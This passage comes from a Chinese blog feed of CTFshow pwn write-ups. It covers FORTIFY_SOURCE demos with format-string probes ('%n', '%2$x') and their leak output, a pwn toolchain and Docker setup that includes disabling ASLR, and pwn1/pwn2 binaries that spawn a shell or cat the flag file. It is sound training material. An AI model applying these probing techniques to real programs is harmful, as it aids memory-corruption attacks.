role of these protections!But don<span class="string">&#x27;t just get a flag</span></span><br><span class="line"><span class="string">Here is your flag:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">flag&#123;just_test_my_process&#125;#本地flag</span></span><br></pre></td></tr></table></figure><h2 id="pwn33"><a href="#pwn33" class="headerlink" title="pwn33"></a>pwn33</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Hint：FORTIFY_SOURCE=1：启用 Fortify 功能的基本级别。 在编译时进行一些安全检查，如缓冲区边界检查、格式化字符串检查等。在运行时进行某些检查，如检测函数返回值和大小的一致性。 如果检测到潜在的安全问题，会触发运行时错误，并终止程序执行。</span><br><span class="line"> ssh ctfshow@pwn.challenge.ctf.show -p28177</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ ssh ctfshow@题目地址 -p题目端口号</span><br><span class="line">...</span><br><span class="line">ctfshow@pwn.challenge.ctf.show<span class="string">&#x27;s password: #输入密码 123456 进行连接</span></span><br><span class="line"><span class="string">$ ./pwnme aaaaaaaa bbbbbbbb ccccccc 6 flag</span></span><br><span class="line"><span class="string">* ************************************* </span></span><br><span class="line"><span class="string">* Classify: CTFshow --- PWN --- 入门</span></span><br><span class="line"><span class="string">* Type  : Linux_Security_Mechanisms     </span></span><br><span class="line"><span class="string">* Site  : https://ctf.show/    </span></span><br><span class="line"><span class="string">* Hint  : FORTIFY 0 1 2   </span></span><br><span class="line"><span class="string">* ************************************* </span></span><br><span class="line"><span class="string">aaaaaaaa CTFshowPWN</span></span><br><span class="line"><span class="string">aaaaaaaa aaaaaaaa</span></span><br><span class="line"><span class="string">flag</span></span><br><span class="line"><span class="string">flag</span></span><br><span class="line"><span class="string">The source code these three programs is the same, and the results of turning on different levels of protection are understood</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">You should understand the role of these protections!But don&#x27;</span>t just get a flag</span><br><span class="line">Here is your flag:</span><br><span class="line"></span><br><span class="line">ctfshow&#123;...&#125;</span><br></pre></td></tr></table></figure><h6 id="分析过程：-16"><a href="#分析过程：-16" class="headerlink" title="分析过程："></a>分析过程：</h6><p>FORTIFY_SOURCE&#x3D;1：</p><p>checksec</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">chmod</span> +x pwn</span><br><span class="line">$ checksec pwn</span><br><span class="line">  Arch:       amd64-64-little</span><br><span class="line">  RELRO:      Full RELRO</span><br><span class="line">  Stack:      No canary found</span><br><span class="line">  NX:         NX enabled</span><br><span class="line">  PIE:        PIE enabled</span><br><span class="line">  FORTIFY:    Enabled  </span><br></pre></td></tr></table></figure><p>可以看到现在检测到开启了FORTIFY保护了</p><p>IDA查看源码：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">__gid_t</span> egid; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v4; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> num; <span class="comment">// [rsp+4h] [rbp-44h] BYREF</span></span><br><span class="line">  <span class="type">char</span> buf2[<span class="number">11</span>]; <span class="comment">// [rsp+Ah] [rbp-3Eh] BYREF</span></span><br><span class="line">  <span class="type">char</span> buf1[<span class="number">11</span>]; <span class="comment">// [rsp+15h] [rbp-33h] BYREF</span></span><br><span class="line"></span><br><span class="line">  egid = getegid();</span><br><span class="line">  setresgid(egid, egid, egid);</span><br><span class="line">  logo();</span><br><span class="line">  v4 = argv[<span class="number">1</span>];</span><br><span class="line">  *(_QWORD *)buf1 = *(_QWORD *)v4;</span><br><span class="line">  *(_WORD *)&amp;buf1[<span class="number">8</span>] = *((_WORD *)v4 + <span class="number">4</span>);</span><br><span class="line">  buf1[<span class="number">10</span>] = v4[<span class="number">10</span>];</span><br><span class="line">  <span class="built_in">strcpy</span>(buf2, <span class="string">&quot;CTFshowPWN&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%s %s\n&quot;</span>, buf1, buf2);</span><br><span class="line">  v5 = strtol(argv[<span class="number">3</span>], <span class="number">0</span>, <span class="number">10</span>);</span><br><span class="line">  __memcpy_chk(buf1, argv[<span class="number">2</span>], v5, <span class="number">11</span>);</span><br><span class="line">  __strcpy_chk(buf2, argv[<span class="number">1</span>], <span class="number">11</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%s %s\n&quot;</span>, buf1, buf2);</span><br><span class="line">  fgets(buf1, <span class="number">11</span>, _bss_start);</span><br><span class="line">  <span class="built_in">printf</span>(buf1, &amp;num);</span><br><span class="line">  <span class="keyword">if</span> ( argc &gt; <span class="number">4</span> )</span><br><span class="line">    Undefined();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到之前的一些危险函数已经被替换成了安全函数，并且在程序运行时进行检查，此时传入的</p><p>argv1就触发了检查，抛出异常。同时格式化字符串%2$x和%n依旧可用：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ ./pwn aaaaaaaaa bbbbbbbbbbbb 6</span><br><span class="line"></span><br><span class="line">    * *************************************</span><br><span class="line">    * Classify: CTFshow --- PWN --- 入门</span><br><span class="line">    * Type  : Linux_Security_Mechanisms</span><br><span class="line">    * Site  : https://ctf.show/</span><br><span class="line">    * Hint  : FORTIFY 0 1 2</span><br><span class="line">    * *************************************</span><br><span class="line">aaaaaaaaa CTFshowPWN</span><br><span class="line">bbbbbbaaa aaaaaaaaa</span><br><span class="line">%n</span><br><span class="line"></span><br><span class="line">$ ./pwn aaaaaaaaa bbbbbbbbbbbb 6</span><br><span class="line">    * *************************************</span><br><span class="line">    * Classify: CTFshow --- PWN --- 入门</span><br><span class="line">    * Type  : Linux_Security_Mechanisms</span><br><span class="line">    * Site  : https://ctf.show/</span><br><span class="line">    * Hint  : FORTIFY 0 1 2</span><br><span class="line">    * *************************************</span><br><span class="line">aaaaaaaaa CTFshowPWN</span><br><span class="line">bbbbbbaaa aaaaaaaaa</span><br><span class="line">%2<span class="variable">$x</span></span><br><span class="line">fbad2288</span><br></pre></td></tr></table></figure><h2 id="pwn34"><a href="#pwn34" class="headerlink" title="pwn34"></a>pwn34</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Hint：FORTIFY_SOURCE=2：启用 Fortify 功能的高级级别。 包括基本级别的安全检查，并添加了更多的检查。在编译时进行更严格的检查，如更精确的缓冲区边界检查。 提供更丰富的编译器警告和错误信息。</span><br><span class="line"> ssh ctfshow@pwn.challenge.ctf.show -p28177</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ ssh ctfshow@题目地址 -p题目端口号</span><br><span class="line">...</span><br><span class="line">ctfshow@pwn.challenge.ctf.show<span class="string">&#x27;s password: #输入密码 123456 进行连接</span></span><br><span class="line"><span class="string">$ $ ./pwnme aaaaa bbbbb ccccc 6 flag</span></span><br><span class="line"><span class="string">    * *************************************</span></span><br><span class="line"><span class="string">    * Classify: CTFshow --- PWN --- 入门</span></span><br><span class="line"><span class="string">    * Type  : Linux_Security_Mechanisms</span></span><br><span class="line"><span class="string">    * Site  : https://ctf.show/</span></span><br><span class="line"><span class="string">    * Hint  : FORTIFY 0 1 2</span></span><br><span class="line"><span class="string">    * *************************************</span></span><br><span class="line"><span class="string">aaaaa CTFshowPWN</span></span><br><span class="line"><span class="string">aaaaa aaaaa</span></span><br><span class="line"><span class="string">flag</span></span><br><span class="line"><span class="string">flag</span></span><br><span class="line"><span class="string">The source code of these three programs is the same, and the results of turning on different levels of protection are understood</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">You should understand the role of these protections!But don&#x27;</span>t just get a flag</span><br><span class="line">Here is your flag:</span><br><span class="line"></span><br><span class="line">flag&#123;just_test_my_process&#125;</span><br></pre></td></tr></table></figure><h6 id="分析过程：-17"><a href="#分析过程：-17" class="headerlink" title="分析过程："></a>分析过程：</h6><p>FORTIFY_SOURCE&#x3D;2：</p><p>checksec</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ checksec pwn</span><br><span class="line">  Arch:       amd64-64-little</span><br><span class="line">  RELRO:      Full RELRO</span><br><span class="line">  Stack:      No canary found</span><br><span class="line">  NX:         NX enabled</span><br><span class="line">  PIE:        PIE enabled</span><br><span class="line">  FORTIFY:    Enabled</span><br><span class="line">  Stripped:   No</span><br><span class="line">  Debuginfo:  Yes</span><br></pre></td></tr></table></figure><p>开启了FORTIFY保护，这次等级为2，在这无法体现出</p><p>IDA查看main函数：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v3; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> num; <span class="comment">// [rsp+4h] [rbp-34h] BYREF</span></span><br><span class="line">  <span class="type">char</span> buf2[<span class="number">11</span>]; <span class="comment">// [rsp+Ah] [rbp-2Eh] BYREF</span></span><br><span class="line">  <span class="type">char</span> buf1[<span class="number">11</span>]; <span class="comment">// [rsp+15h] [rbp-23h] BYREF</span></span><br><span class="line"></span><br><span class="line">  logo();</span><br><span class="line">  v3 = argv[<span class="number">1</span>];</span><br><span class="line">  *(_QWORD *)buf1 = *(_QWORD *)v3;</span><br><span class="line">  *(_WORD *)&amp;buf1[<span class="number">8</span>] = *((_WORD *)v3 + <span class="number">4</span>);</span><br><span class="line">  buf1[<span class="number">10</span>] = v3[<span class="number">10</span>];</span><br><span class="line">  <span class="built_in">strcpy</span>(buf2, <span class="string">&quot;CTFshowPWN&quot;</span>);</span><br><span class="line">  __printf_chk(<span class="number">1</span>, <span class="string">&quot;%s %s\n&quot;</span>, buf1, buf2);</span><br><span class="line">  v4 = strtol(argv[<span class="number">3</span>], <span class="number">0</span>, <span class="number">10</span>);</span><br><span class="line">  __memcpy_chk(buf1, argv[<span class="number">2</span>], v4, <span class="number">11</span>);</span><br><span class="line">  __strcpy_chk(buf2, argv[<span class="number">1</span>], <span class="number">11</span>);</span><br><span class="line">  __printf_chk(<span class="number">1</span>, <span class="string">&quot;%s %s\n&quot;</span>, buf1, buf2);</span><br><span class="line">  fgets(buf1, <span class="number">11</span>, _bss_start);</span><br><span class="line">  __printf_chk(<span class="number">1</span>, buf1, &amp;num);</span><br><span class="line">  Undefined();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在IDA中能看到将printf函数也替换成了安全函数，那么格式化字符串%n也无法利用了，而%N$也</p><p>要从%1$开始连续才可用：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ ./pwn aaaaaaaaa bbbbbbbbbbbb 6</span><br><span class="line">    * *************************************</span><br><span class="line">    * Classify: CTFshow --- PWN --- 入门</span><br><span class="line">    * Type  : Linux_Security_Mechanisms</span><br><span class="line">    * Site  : https://ctf.show/</span><br><span class="line">    * Hint  : FORTIFY 0 1 2</span><br><span class="line">    * *************************************</span><br><span class="line">aaaaaaaaa CTFshowPWN</span><br><span class="line">bbbbbbaaa aaaaaaaaa</span><br><span class="line">%n</span><br><span class="line">*** %n <span class="keyword">in</span> writable segment detected ***</span><br><span class="line">Aborted (core dumped)</span><br><span class="line">$ ./pwn aaaaaaaaa bbbbbbbbbbbb 6</span><br><span class="line">    * *************************************</span><br><span class="line">    * Classify: CTFshow --- PWN --- 入门</span><br><span class="line">    * Type  : Linux_Security_Mechanisms</span><br><span class="line">    * Site  : https://ctf.show/</span><br><span class="line">    * Hint  : FORTIFY 0 1 2</span><br><span class="line">    * *************************************</span><br><span class="line">aaaaaaaaa CTFshowPWN</span><br><span class="line">bbbbbbaaa aaaaaaaaa</span><br><span class="line">%2<span class="variable">$x</span></span><br><span class="line">*** invalid %N$ use detected ***</span><br><span class="line">Aborted (core dumped)</span><br><span class="line">$ ./pwn aaaaaaaaa bbbbbbbbbbbb 6</span><br><span class="line">    * *************************************</span><br><span class="line">    * Classify: CTFshow --- PWN --- 入门</span><br><span class="line">    * Type  : Linux_Security_Mechanisms</span><br><span class="line">    * Site  : https://ctf.show/</span><br><span class="line">    * Hint  : FORTIFY 0 1 2</span><br><span class="line">    * *************************************</span><br><span class="line">aaaaaaaaa CTFshowPWN</span><br><span class="line">bbbbbbaaa aaaaaaaaa</span><br><span class="line">%2<span class="variable">$x</span>%1<span class="variable">$x</span></span><br><span class="line">25782432ffffe384</span><br><span class="line">The <span class="built_in">source</span> code of these three programs is the same, and the results of turning on different levels of protection are understood</span><br><span class="line"></span><br><span class="line">You should understand the role of these protections!But don<span class="string">&#x27;t just get a flag</span></span><br><span class="line"><span class="string">Here is your flag:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">flag&#123;just_test_my_process&#125;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Ubuntu18.04本地搭建环境</title>
      <link href="/2025/07/fc81dbb2cd60.html"/>
      <url>/2025/07/fc81dbb2cd60.html</url>
      
        <content type="html"><![CDATA[<h4 id="1-更新系统和安装基本依赖"><a href="#1-更新系统和安装基本依赖" class="headerlink" title="1. 更新系统和安装基本依赖"></a>1. 更新系统和安装基本依赖</h4><p>首先确保系统是最新的，并安装必要的编译工具和依赖库：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt update &amp;&amp; <span class="built_in">sudo</span> apt upgrade -y</span><br><span class="line"><span class="built_in">sudo</span> apt install build-essential python3 python3-pip git gdb gdb-multiarch libc6-dbg libffi-dev libssl-dev</span><br></pre></td></tr></table></figure><h4 id="2-安装-pwntools（Pwn-开发库）"><a href="#2-安装-pwntools（Pwn-开发库）" class="headerlink" title="2. 安装 pwntools（Pwn 开发库）"></a>2. 安装 pwntools（Pwn 开发库）</h4><p>pwntools 是 Python 编写的用于二进制漏洞利用开发的强大库，我们将在虚拟环境中安装它：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 创建并激活 Python 虚拟环境</span></span><br><span class="line"><span class="built_in">sudo</span> apt-get install python3-venv</span><br><span class="line">python3 -m venv pwn_env</span><br><span class="line"><span class="built_in">source</span> pwn_env/bin/activate</span><br><span class="line"></span><br><span class="line"><span class="comment"># 在虚拟环境中安装 pwntools</span></span><br><span class="line">pip install --upgrade pip</span><br><span class="line">pip install pwntools</span><br></pre></td></tr></table></figure><h4 id="3-安装-pwndbg（GDB-增强工具）"><a href="#3-安装-pwndbg（GDB-增强工具）" class="headerlink" title="3. 安装 pwndbg（GDB 增强工具）"></a>3. 安装 pwndbg（GDB 增强工具）</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> ~</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/pwndbg/pwndbg</span><br><span class="line"><span class="built_in">cd</span> pwndbg</span><br><span class="line">./setup.sh</span><br></pre></td></tr></table></figure><h4 id="4-配置-Pwn-环境（可选但推荐）"><a href="#4-配置-Pwn-环境（可选但推荐）" class="headerlink" title="4. 配置 Pwn 环境（可选但推荐）"></a>4. 配置 Pwn 环境（可选但推荐）</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 启用 ASLR（地址空间布局随机化）控制</span></span><br><span class="line"><span class="built_in">echo</span> 0 | <span class="built_in">sudo</span> <span class="built_in">tee</span> /proc/sys/kernel/randomize_va_space  <span class="comment"># 禁用 ASLR（用于调试）</span></span><br><span class="line"><span class="built_in">echo</span> 2 | <span class="built_in">sudo</span> <span class="built_in">tee</span> /proc/sys/kernel/randomize_va_space  <span class="comment"># 启用 ASLR（默认）</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建永久别名</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;alias gdb=&#x27;gdb -q&#x27;&quot;</span> &gt;&gt; ~/.bashrc  <span class="comment"># 禁用 GDB 启动信息</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;alias pwndbg=&#x27;gdb -q -ex \&quot;source ~/pwndbg/gdbinit.py\&quot;&#x27;&quot;</span> &gt;&gt; ~/.bashrc  <span class="comment"># 使用 pwndbg</span></span><br><span class="line"><span class="built_in">source</span> ~/.bashrc</span><br></pre></td></tr></table></figure><h4 id="5-安装其他常用-Pwn-工具"><a href="#5-安装其他常用-Pwn-工具" class="headerlink" title="5. 安装其他常用 Pwn 工具"></a>5. 安装其他常用 Pwn 工具</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ROPgadget - 用于查找 ROP 链</span></span><br><span class="line">pip install ropgadget</span><br><span class="line"></span><br><span class="line"><span class="comment"># one_gadget - 查找 libc 中的 one gadget</span></span><br><span class="line">wget -O ruby-install-0.8.3.tar.gz https://github.com/postmodern/ruby-install/archive/v0.8.3.tar.gz</span><br><span class="line">tar -xzvf ruby-install-0.8.3.tar.gz</span><br><span class="line"><span class="built_in">cd</span> ruby-install-0.8.3/</span><br><span class="line"><span class="built_in">sudo</span> make install</span><br><span class="line">ruby-install ruby 3.1.0</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;export PATH=&quot;$HOME/.rubies/ruby-3.1.0/bin:$PATH&quot;&#x27;</span> &gt;&gt; ~/.bashrc</span><br><span class="line"><span class="built_in">source</span> ~/.bashrc</span><br><span class="line">~/.rubies/ruby-3.1.0/bin/gem install one_gadget</span><br><span class="line"></span><br><span class="line"><span class="comment"># patchelf - 修改 ELF 文件</span></span><br><span class="line"><span class="built_in">sudo</span> apt install patchelf</span><br><span class="line"></span><br><span class="line"><span class="comment"># binwalk - 分析二进制文件</span></span><br><span class="line"><span class="built_in">sudo</span> apt install binwalk</span><br><span class="line"></span><br><span class="line"><span class="comment"># LibcSearch - 查找和分析 libc 库的工具</span></span><br><span class="line">git <span class="built_in">clone</span> https://github.com/lieanu/LibcSearcher.git </span><br><span class="line"><span class="built_in">cd</span> LibcSearcher </span><br><span class="line">python3 setup.py develop</span><br><span class="line"></span><br><span class="line"><span class="comment"># ropper</span></span><br><span class="line"><span class="comment"># 安装依赖项capstone</span></span><br><span class="line">pip3 install capstone</span><br><span class="line"><span class="comment"># 安装依赖项filebytes</span></span><br><span class="line">pip3 install filebytes</span><br><span class="line"><span class="comment"># 拉取源代码</span></span><br><span class="line">git <span class="built_in">clone</span> https://github.com/sashs/ropper.git</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="乱七八糟编译环境"><a href="#乱七八糟编译环境" class="headerlink" title="乱七八糟编译环境"></a>乱七八糟编译环境</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo dpkg --add-architecture i386</span><br><span class="line">sudo apt install gawk</span><br><span class="line">sudo apt install libc6-dbg  libc6-dbg:i386</span><br><span class="line">sudo apt-get install links:i386</span><br><span class="line">sudo apt-get install libstdc++6:i386 libgcc1:i386 zlib1g:i386 libncurses5:i386</span><br><span class="line">sudo apt-get install gcc-multilib g++-multilib</span><br><span class="line">sudo apt-get install libssl-dev libffi-dev build-essential</span><br></pre></td></tr></table></figure><h4 id="使用虚拟环境的注意事项"><a href="#使用虚拟环境的注意事项" class="headerlink" title="使用虚拟环境的注意事项"></a>使用虚拟环境的注意事项</h4><p>每次使用 Pwn 环境时，需要先激活虚拟环境：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">source</span> pwn_env/bin/activate</span><br></pre></td></tr></table></figure><p>当完成工作后，可以使用以下命令退出虚拟环境：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">deactivate</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
          <category> Learning </category>
          
          <category> 3-分析环境搭建 </category>
          
          <category> Ubuntu </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>配置</title>
      <link href="/2025/07/c761e0474131.html"/>
      <url>/2025/07/c761e0474131.html</url>
      
        <content type="html"><![CDATA[<p><code>声明：都是官方wp，只是加了我不懂的地方</code></p><p>前置看环境搭建</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> docker run -d \</span><br><span class="line">-p 25000:22 \</span><br><span class="line">--name=show_pwn \</span><br><span class="line">--cap-add=SYS_PTRACE \</span><br><span class="line">-v ~/Desktop/CTFshow_pwn:/CTFshow_pwn \</span><br><span class="line">pwnenv_ubuntu24</span><br><span class="line"></span><br><span class="line"><span class="built_in">sudo</span> docker start show_pwn</span><br><span class="line"><span class="built_in">sudo</span> docker <span class="built_in">exec</span> -w /CTFshow_pwn -e TERM=xterm-256color -u ubuntu -it show_pwn bash   <span class="comment">#进入容器</span></span><br></pre></td></tr></table></figure><p>关闭ALSR</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rhea@rhea-VMware-Virtual-Platform:~$ <span class="built_in">sudo</span> docker run -it --privileged --<span class="built_in">rm</span> pwnenv_ubuntu24 /bin/bash</span><br><span class="line">root@5c9e7214e2da:/# <span class="built_in">echo</span> 0 &gt; /proc/sys/kernel/randomize_va_space</span><br><span class="line">root@5c9e7214e2da:/# <span class="built_in">cat</span> /proc/sys/kernel/randomize_va_space</span><br></pre></td></tr></table></figure><p>打开tmux</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ tmux new-session -d -s pwn_session</span><br><span class="line"><span class="comment"># 然后在tmux会话中运行你的脚本</span></span><br><span class="line">$ tmux attach -t pwn_session</span><br><span class="line">$ python3 exp.py</span><br><span class="line">$ tmux <span class="built_in">ls</span> <span class="comment">#查看会话</span></span><br><span class="line">$ tmux kill-session -t pwn_session <span class="comment">#删除所有会话</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>pwn1-4</title>
      <link href="/2025/07/deec9f9547c3.html"/>
      <url>/2025/07/deec9f9547c3.html</url>
      
        <content type="html"><![CDATA[<h1 id="Test-your-nc"><a href="#Test-your-nc" class="headerlink" title="Test_your_nc"></a>Test_your_nc</h1><h2 id="pwn1"><a href="#pwn1" class="headerlink" title="pwn1"></a>pwn1</h2><p>Hint：提供一个后门函数，连上即可得到flag</p><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">远程：</span><br><span class="line">nc ip 端口</span><br><span class="line">即可打通</span><br></pre></td></tr></table></figure><p>本地：</p><p>checksec检查保护</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">chmod</span> +x pwn</span><br><span class="line">$ checksec  pwn</span><br><span class="line">  Arch:     amd64-64-little</span><br><span class="line">  RELRO:    Full RELRO</span><br><span class="line">  Stack:    No canary found</span><br><span class="line">  NX:       NX enabled</span><br><span class="line">  PIE:      PIE enabled</span><br></pre></td></tr></table></figure><p>64位仅关闭Canary保护</p><p>用64位IDA打开查看main函数（按F5进入反汇编或者Tab键）</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  setvbuf(_bss_start, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(s);</span><br><span class="line">  <span class="built_in">puts</span>(asc_950);</span><br><span class="line">  <span class="built_in">puts</span>(asc_9D0);</span><br><span class="line">  <span class="built_in">puts</span>(asc_A60);</span><br><span class="line">  <span class="built_in">puts</span>(asc_AF0);</span><br><span class="line">  <span class="built_in">puts</span>(asc_B78);</span><br><span class="line">  <span class="built_in">puts</span>(asc_C10);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * *************************************                           &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(aClassifyCtfsho);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Type  : Test                                                    &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Site  : https://ctf.show/                                       &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Hint  : You only need to connect to the remote address with NC to get the flag!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * *************************************                           &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;I think now it is necessary to test whether your NC is useful!        &quot;</span>);</span><br><span class="line">  system(<span class="string">&quot;cat /ctfshow_flag&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>程序直接执行了后门函数</p><p>程序中执行的system函数里面的命令就是在shell中执行了此命令，因此</p><p>当远程环境的根目录中存在此文件就会直接将其读出来</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ ./pwn</span><br><span class="line">    * *************************************</span><br><span class="line">    * Classify: CTFshow --- PWN --- 入门</span><br><span class="line">    * Type  : Test</span><br><span class="line">    * Site  : https://ctf.show/</span><br><span class="line">    * Hint  : You only need to connect to the remote address with NC to get the flag!</span><br><span class="line">    * *************************************</span><br><span class="line">I think now it is necessary to <span class="built_in">test</span> whether your NC is useful!</span><br><span class="line"><span class="built_in">cat</span>: /ctfshow_flag: No such file or directory</span><br></pre></td></tr></table></figure><p>在本地测试运行，根目录没有这个文件</p><p>可以尝试在根目录写一个与其文件名相同的文件进行测试</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">sudo</span> bash -c <span class="string">&quot;echo &#x27;flag&#123;just_test_my_process&#125;&#x27;&gt; /ctfshow_flag&quot;</span>   <span class="comment">#通过 bash -c 让整个命令（包括重定向）在提升权限的 shell 中执行</span></span><br></pre></td></tr></table></figure><p>再运行程序就能得到本地写入的flag值</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ ./pwn</span><br><span class="line">    * *************************************</span><br><span class="line">    * Classify: CTFshow --- PWN --- 入门</span><br><span class="line">    * Type  : Test</span><br><span class="line">    * Site  : https://ctf.show/</span><br><span class="line">    * Hint  : You only need to connect to the remote address with NC to get the flag!</span><br><span class="line">    * *************************************</span><br><span class="line">I think now it is necessary to <span class="built_in">test</span> whether your NC is useful!</span><br><span class="line">flag&#123;just_test_my_process&#125;</span><br></pre></td></tr></table></figure><h2 id="pwn2"><a href="#pwn2" class="headerlink" title="pwn2"></a>pwn2</h2><p>Hint：给你一个shell，这次需要你自己去获得flag</p><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">远程：</span><br><span class="line">nc ip 端口</span><br></pre></td></tr></table></figure><p>本地：</p><p>checksec检查保护</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">chmod</span> +x pwn</span><br><span class="line">$ checksec pwn</span><br><span class="line">  Arch:     amd64-64-little</span><br><span class="line">  RELRO:    Full RELRO</span><br><span class="line">  Stack:    No canary found</span><br><span class="line">  NX:       NX enabled</span><br><span class="line">  PIE:      PIE enabled</span><br></pre></td></tr></table></figure><p>64位仅关闭Canary保护 </p><p>用64位IDA打开查看main函数（按F5进入反汇编或者Tab键）</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  setvbuf(_bss_start, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  logo();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot; Now, you can use &#x27;cat /ctfshow_flag&#x27; to get flag! &quot;</span>);</span><br><span class="line">  system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到，程序依旧是非常的简单，但是这次system函数里面的字符串变成了“&#x2F;bin&#x2F;sh”，那么直接运行它会发生什么呢？</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">ls</span> -l /bin/sh</span><br><span class="line">lrwxrwxrwx 1 root root 4 Nov 23  2023 /bin/sh -&gt; dash</span><br></pre></td></tr></table></figure><p>它指向dash</p><p>那system(“&#x2F;bin&#x2F;sh”);的工作原理又是什么呢？system()函数先fork一个子进程，在这个子进程中调用&#x2F;bin&#x2F;sh 